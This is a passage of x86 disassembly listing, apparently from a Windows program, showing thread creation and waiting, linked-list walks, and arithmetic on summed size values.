  404427:	33 c0                	xor    %eax,%eax
  404429:	e8 72 15 00 00       	call   0x4059a0
  40442e:	83 c4 04             	add    $0x4,%esp
  404431:	eb 65                	jmp    0x404498
  404433:	8b 35 14 81 40 00    	mov    0x408114,%esi
  404439:	6a 00                	push   $0x0
  40443b:	6a 00                	push   $0x0
  40443d:	8d 54 24 18          	lea    0x18(%esp),%edx
  404441:	52                   	push   %edx
  404442:	68 70 42 40 00       	push   $0x404270
  404447:	6a 00                	push   $0x0
  404449:	6a 00                	push   $0x0
  40444b:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  404452:	00 
  404453:	c6 44 24 2c 01       	movb   $0x1,0x2c(%esp)
  404458:	ff d6                	call   *%esi
  40445a:	6a 00                	push   $0x0
  40445c:	6a 00                	push   $0x0
  40445e:	6a 00                	push   $0x0
  404460:	68 90 42 40 00       	push   $0x404290
  404465:	6a 00                	push   $0x0
  404467:	6a 00                	push   $0x0
  404469:	89 44 24 20          	mov    %eax,0x20(%esp)
  40446d:	ff d6                	call   *%esi
  40446f:	6a ff                	push   $0xffffffff
  404471:	89 44 24 10          	mov    %eax,0x10(%esp)
  404475:	6a 01                	push   $0x1
  404477:	8d 44 24 10          	lea    0x10(%esp),%eax
  40447b:	50                   	push   %eax
  40447c:	6a 02                	push   $0x2
  40447e:	ff 15 28 81 40 00    	call   *0x408128
  404484:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404488:	8b 35 48 81 40 00    	mov    0x408148,%esi
  40448e:	51                   	push   %ecx
  40448f:	ff d6                	call   *%esi
  404491:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404495:	52                   	push   %edx
  404496:	ff d6                	call   *%esi
  404498:	e8 63 00 00 00       	call   0x404500
  40449d:	a1 50 b2 41 00       	mov    0x41b250,%eax
  4044a2:	85 c0                	test   %eax,%eax
  4044a4:	74 49                	je     0x4044ef
  4044a6:	8b 08                	mov    (%eax),%ecx
  4044a8:	85 c9                	test   %ecx,%ecx
  4044aa:	8b d1                	mov    %ecx,%edx
  4044ac:	74 41                	je     0x4044ef
  4044ae:	8b 42 04             	mov    0x4(%edx),%eax
  4044b1:	85 c0                	test   %eax,%eax
  4044b3:	74 09                	je     0x4044be
  4044b5:	8b d0                	mov    %eax,%edx
  4044b7:	8b 42 04             	mov    0x4(%edx),%eax
  4044ba:	85 c0                	test   %eax,%eax
  4044bc:	75 f7                	jne    0x4044b5
  4044be:	83 3a 00             	cmpl   $0x0,(%edx)
  4044c1:	74 2c                	je     0x4044ef
  4044c3:	8b 41 04             	mov    0x4(%ecx),%eax
  4044c6:	85 c0                	test   %eax,%eax
  4044c8:	74 0f                	je     0x4044d9
  4044ca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4044d0:	8b c8                	mov    %eax,%ecx
  4044d2:	8b 41 04             	mov    0x4(%ecx),%eax
  4044d5:	85 c0                	test   %eax,%eax
  4044d7:	75 f7                	jne    0x4044d0
  4044d9:	8b 09                	mov    (%ecx),%ecx
  4044db:	e8 90 e8 ff ff       	call   0x402d70
  4044e0:	85 d2                	test   %edx,%edx
  4044e2:	7c 0b                	jl     0x4044ef
  4044e4:	7f 04                	jg     0x4044ea
  4044e6:	85 c0                	test   %eax,%eax
  4044e8:	76 05                	jbe    0x4044ef
  4044ea:	e8 41 2c 00 00       	call   0x407130
  4044ef:	33 c0                	xor    %eax,%eax
  4044f1:	5e                   	pop    %esi
  4044f2:	5b                   	pop    %ebx
  4044f3:	83 c4 14             	add    $0x14,%esp
  4044f6:	e9 05 32 00 00       	jmp    0x407700
  4044fb:	cc                   	int3
  4044fc:	cc                   	int3
  4044fd:	cc                   	int3
  4044fe:	cc                   	int3
  4044ff:	cc                   	int3
  404500:	8b 15 50 b2 41 00    	mov    0x41b250,%edx
  404506:	81 ec 34 04 00 00    	sub    $0x434,%esp
  40450c:	85 d2                	test   %edx,%edx
  40450e:	53                   	push   %ebx
  40450f:	55                   	push   %ebp
  404510:	56                   	push   %esi
  404511:	57                   	push   %edi
  404512:	0f 84 4f 03 00 00    	je     0x404867
  404518:	8b 02                	mov    (%edx),%eax
  40451a:	85 c0                	test   %eax,%eax
  40451c:	0f 84 45 03 00 00    	je     0x404867
  404522:	8b 48 04             	mov    0x4(%eax),%ecx
  404525:	85 c9                	test   %ecx,%ecx
  404527:	74 10                	je     0x404539
  404529:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404530:	8b c1                	mov    %ecx,%eax
  404532:	8b 48 04             	mov    0x4(%eax),%ecx
  404535:	85 c9                	test   %ecx,%ecx
  404537:	75 f7                	jne    0x404530
  404539:	83 38 00             	cmpl   $0x0,(%eax)
  40453c:	0f 84 25 03 00 00    	je     0x404867
  404542:	e8 89 20 00 00       	call   0x4065d0
  404547:	8b 0a                	mov    (%edx),%ecx
  404549:	85 c9                	test   %ecx,%ecx
  40454b:	74 12                	je     0x40455f
  40454d:	8b 41 04             	mov    0x4(%ecx),%eax
  404550:	85 c0                	test   %eax,%eax
  404552:	74 09                	je     0x40455d
  404554:	8b c8                	mov    %eax,%ecx
  404556:	8b 41 04             	mov    0x4(%ecx),%eax
  404559:	85 c0                	test   %eax,%eax
  40455b:	75 f7                	jne    0x404554
  40455d:	8b 09                	mov    (%ecx),%ecx
  40455f:	8b 41 34             	mov    0x34(%ecx),%eax
  404562:	33 d2                	xor    %edx,%edx
  404564:	33 f6                	xor    %esi,%esi
  404566:	85 c0                	test   %eax,%eax
  404568:	74 20                	je     0x40458a
  40456a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404570:	8b 88 48 00 01 00    	mov    0x10048(%eax),%ecx
  404576:	03 d1                	add    %ecx,%edx
  404578:	8b 88 4c 00 01 00    	mov    0x1004c(%eax),%ecx
  40457e:	8b 80 50 00 01 00    	mov    0x10050(%eax),%eax
  404584:	13 f1                	adc    %ecx,%esi
  404586:	85 c0                	test   %eax,%eax
  404588:	75 e6                	jne    0x404570
  40458a:	6a 00                	push   $0x0
  40458c:	6a 64                	push   $0x64
  40458e:	56                   	push   %esi
  40458f:	52                   	push   %edx
  404590:	e8 ab 34 00 00       	call   0x407a40
  404595:	6a 00                	push   $0x0
  404597:	68 00 00 00 40       	push   $0x40000000
  40459c:	52                   	push   %edx
  40459d:	50                   	push   %eax
  40459e:	e8 0d 33 00 00       	call   0x4078b0
  4045a3:	8b fa                	mov    %edx,%edi
  4045a5:	8d 54 24 24          	lea    0x24(%esp),%edx
  4045a9:	52                   	push   %edx
  4045aa:	8b f0                	mov    %eax,%esi
  4045ac:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4045b1:	6a 2c                	push   $0x2c
  4045b3:	e8 98 e3 ff ff       	call   0x402950
  4045b8:	8b e8                	mov    %eax,%ebp
  4045ba:	85 ed                	test   %ebp,%ebp
